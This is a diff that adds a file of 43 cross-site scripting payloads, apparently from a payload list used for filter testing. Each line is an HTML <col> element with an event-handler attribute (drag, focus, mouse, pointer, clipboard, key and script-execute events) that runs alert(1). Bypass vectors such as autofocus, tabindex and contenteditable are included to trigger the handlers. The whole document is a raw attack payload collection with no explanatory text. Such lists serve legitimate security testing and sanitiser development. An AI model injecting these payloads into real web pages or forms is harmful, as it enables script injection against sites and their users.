@@ -1,0 +1,43 @@
+<col draggable="true" ondrag="alert(1)">test</col>
+<col draggable="true" ondragend="alert(1)">test</col>
+<col draggable="true" ondragenter="alert(1)">test</col>
+<col draggable="true" ondragleave="alert(1)">test</col>
+<col draggable="true" ondragstart="alert(1)">test</col>
+<col id=x tabindex=1 onactivate=alert(1)></col>
+<col id=x tabindex=1 onbeforeactivate=alert(1)></col>
+<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>
+<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>
+<col id=x tabindex=1 onfocus=alert(1)></col>
+<col id=x tabindex=1 onfocusin=alert(1)></col>
+<col onafterscriptexecute=alert(1)><script>1</script>
+<col onbeforecopy="alert(1)" contenteditable>test</col>
+<col onbeforecut="alert(1)" contenteditable>test</col>
+<col onbeforepaste="alert(1)" contenteditable>test</col>
+<col onbeforescriptexecute=alert(1)><script>1</script>
+<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>
+<col onclick="alert(1)">test</col>
+<col oncontextmenu="alert(1)">test</col>
+<col oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<col oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<col ondblclick="alert(1)" autofocus tabindex=1>test</col>
+<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>
+<col onkeydown="alert(1)" contenteditable>test</col>
+<col onkeypress="alert(1)" contenteditable>test</col>
+<col onkeyup="alert(1)" contenteditable>test</col>
+<col onmousedown="alert(1)">test</col>
+<col onmouseenter="alert(1)">test</col>
+<col onmouseleave="alert(1)">test</col>
+<col onmousemove="alert(1)">test</col>
+<col onmouseout="alert(1)">test</col>
+<col onmouseover="alert(1)">test</col>
+<col onmouseup="alert(1)">test</col>
+<col onmousewheel=alert(1)>requires scrolling
+<col onpaste="alert(1)" contenteditable>test</col>
+<col onpointerdown=alert(1)>XSS</col>
+<col onpointerenter=alert(1)>XSS</col>
+<col onpointerleave=alert(1)>XSS</col>
+<col onpointermove=alert(1)>XSS</col>
+<col onpointerout=alert(1)>XSS</col>
+<col onpointerover=alert(1)>XSS</col>
+<col onpointerrawupdate=alert(1)>XSS</col>
+<col onpointerup=alert(1)>XSS</col>
